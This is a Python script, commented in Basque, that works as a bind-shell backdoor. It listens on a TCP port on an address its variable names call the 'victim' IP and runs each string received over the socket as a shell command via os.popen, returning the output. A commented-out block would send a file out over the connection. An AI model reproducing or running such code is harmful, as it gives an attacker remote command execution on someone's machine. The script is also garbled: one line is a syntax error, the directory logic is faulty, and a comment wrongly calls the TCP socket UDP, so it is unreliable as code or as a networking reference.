import os
import socket 
import time





class server(object):
    def __init__(self,ip_bictima,portua,koneksioak):
        print(ip_bictima)
        print(portua)
        print(koneksioak)
        self.so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.so.bind((ip_bictima,portua))
        self.so.listen(koneksioak)
        self.soc , addr = self.so.accept()
    
    

    def koneksioa(self):
      while True:
          url = os.getcwd()
          self.soc.send(bytes(url,encoding = 'utf-8'))
          byte_tama = os.path.getsize(url)
          print          
          .erantzuna = None
          hartuta = self.soc.recv(1024)
          stri = str(hartuta,encoding='utf-8')
          if stri == "itxi":
              break
          comand = stri.split(" ")
          print(comand)
          print("hartuta:", hartuta) 
          if comand[0].lower() == "cd" and len(comand) == 2:
              if comand[1] == "..":
                url_a = url.split("\\")[:-1]
                url = ""
                for x in url_a:
                  url += x + "\\"
                  os.chdir(url)
              else:
                  erantzuna = "comandoa gaizki dago"
          else:
            balioa = os.popen(stri,'r',1).close()
            erantzuna = os.popen(stri,'r',1).read()
            print(erantzuna)
            print(balioa)   
            if balioa == 1:
                erantzuna = "comandoa gaizki dago"
            if balioa == 2:
                erantzuna = "ez dazkazu baimenik"
            if balioa == None and comand[0].lower() == "mkdir" or stri.lower() == "net user *" :
                erantzuna = "informazio ezezaguna"
          self.soc.send(bytes(erantzuna,encoding = 'utf-8'))
          #fichategia = open("CURRICULUM.pdf",'rb').read()
          #print(fichategia)
          #self.soc.sendall(fichategia)
      print("agur")
      self.so.close()
      self.soc.close()

ser = server("192.168.0.10",9999,1)
ser.koneksioa()




#recv mezua lortzeko balio du udp protokoloan
#send mezua bidaltzeko balio du udp protokoloan






